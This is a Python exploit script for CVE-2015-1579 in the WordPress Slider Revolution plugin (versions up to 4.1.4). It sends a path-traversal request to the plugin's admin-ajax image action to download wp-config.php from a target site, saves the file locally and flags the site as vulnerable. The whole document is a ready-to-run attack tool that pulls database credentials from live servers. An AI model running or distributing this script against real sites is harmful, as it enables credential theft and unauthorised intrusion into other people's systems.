
# Exploit: Wordpress CVE-2015-1579 Arbitrary file download
# Vuln Date: 24/07/2014
# Exploit Author: anarc0der
# Version: Wordpress Slider Revolution Responsive <= 4.1.4
# CVE : CVE-2015-1579
"""
Usage:
    xpl.py --url=<arg>
    xpl.py --help
    xpl.py --version

Options:
    -h --help            Open help menu
    -v --version         Show version

Required options:
    --url='url target'   your target :)

"""
import sys
import os
import requests
from docopt import docopt, DocoptExit

user_agent = "Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) "\
             "AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mob"\
             "ile/9A334 Safari/7534.48.3"
wp_config = "/wp-admin/admin-ajax.php?action=revslider_show_image&img="\
            "../wp-config.php"


class WordpressAFD():

    def __init__(self, p_target):
        self.target = p_target
        self.check_target(self.target)
        self.exploit_target(self.target)

    @staticmethod
    def banner():
        os.system('clear')
        print("WP Revslider <= 4.1 - AFD - anarcoder at protonmail.com\n")

    def check_target(self, p_target):
        """Check connection and current path of target.

        Method used to check if website is up and path of wp application."""
        try:
            headers = {'User-Agent': user_agent}
            print("[+] Attempting connecting to target")
            req = requests.get(p_target, headers=headers, verify=False)
            if req.status_code == 200:
                print("[+] Connection successful..")
                self.target = req.url
        except:
            print("\n[#] Something get wrong... =/")
            print("Check if you write the target correct..")
            print("Ex: http://www.target.com")
            print(self.target)
            sys.exit(1)

    def exploit_target(self, p_target):
        """Exploit target.

        Method that try AFD on target."""
        filename = ''.join(p_target.split("http*://")).split("/")[2]
        headers = {'User-Agent': user_agent}
        p_target += wp_config
        print("[+] Attemping to exploit target...")
        req = requests.get(p_target, headers=headers, verify=False)
        if req.status_code == 200:
            with open(filename, 'wb') as f:
                for chunk in req.iter_content(chunk_size=1024):
                    if chunk:
                        f.write(chunk)
            arq = open(filename, 'r')
            if '<?php' in arq.readline():
                print('[+] \033[31mVulnerable!!\033[33m '
                      'wp-config exposed..\033[39m\n')
                arq.close()
        else:
            print('[-] Not vulnerable\n')


def main():
    try:
        pass
        arguments = docopt(__doc__, version="CVE-2015-1579")
        target = arguments['--url']
    except DocoptExit:
        os.system('python xpl.py --help')
        sys.exit(1)

    WordpressAFD(target)


if __name__ == '__main__':
    main()
